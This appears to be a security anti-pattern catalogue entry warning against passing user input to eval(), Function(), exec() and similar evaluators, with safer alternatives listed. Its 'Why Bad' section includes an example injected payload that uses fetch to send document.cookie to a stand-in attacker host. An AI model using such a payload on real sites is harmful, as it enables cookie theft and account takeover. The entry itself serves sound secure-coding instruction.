# EvalUserInput [anti-pattern] v1.0.0
Passing user-controlled strings directly to dynamic code evaluators — JavaScript eval(), Function constructor, Python exec()/eval(), Ruby eval/instance_eval, PHP eval() — resulting in arbitrary code execution.
domain: security

## Label
eval() / Function() / exec() on user input

## Why Bad
User input → arbitrary code execution (ACE/RCE). eval('1+' + userInput) where userInput = '1; fetch("https://evil.com/?c=" + document.cookie)' yields full XSS with data exfiltration in <100 characters. Across languages the same pattern is catastrophic: JavaScript Function constructor runs in the same execution context as eval; Python exec(input()) was the textbook RCE example for decades; PHP's preg_replace /e modifier (now deprecated) evaluated the replacement as PHP. Even in template engines: if a user controls the template string (not just data), Handlebars/Pug/Nunjucks precompilation paths can execute arbitrary code.

## Instead Do
Use parsing libraries for structured data: JSON.parse() for JSON, csv-parse for CSV, date-fns/date-parse for dates. If the use case is user-supplied expressions or formulas, use a sandboxed evaluator (mathjs for math expressions, jsep for expression parsing without evaluation). If you genuinely need user-supplied code, run it in an isolated process (Node.js worker_thread with no shared memory, Web Worker with limited API surface, Docker container with seccomp profile). Always validate input against a strict allowlist before any evaluation path.
